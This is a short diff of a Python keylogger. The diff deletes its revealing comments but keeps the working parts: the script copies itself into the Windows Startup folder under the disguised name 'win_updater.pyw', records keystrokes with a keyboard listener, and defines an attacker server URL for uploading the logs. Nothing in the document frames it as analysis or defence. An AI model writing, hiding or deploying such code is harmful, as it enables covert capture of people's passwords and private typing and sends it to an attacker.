@@ -8,8 +8,8 @@ from pathlib import Path
 # -------------- ADD TO STARTUP SECTION --------------
 def add_to_startup():
     startup_dir = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
-    script_path = os.path.realpath(_file)  # ✅ Corrected __file
-    target_path = os.path.join(startup_dir, "win_updater.pyw")  # disguise the name
+    script_path = os.path.realpath(_file)  
+    target_path = os.path.join(startup_dir, "win_updater.pyw")  
 
     if not os.path.exists(target_path):
         shutil.copy(script_path, target_path)
@@ -27,7 +27,7 @@ x = False
 log_file = 'logs.json'
 START_LOGGING = False
 
-# ✅ Update this to your attacker's IP
+
 ATTACKER_SERVER = 'http://192.168.1.71:5000/upload'
 
 
@@ -75,6 +75,5 @@ def on_release(key):
     x = False
 
 
-# ✅ Start the keylogger listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
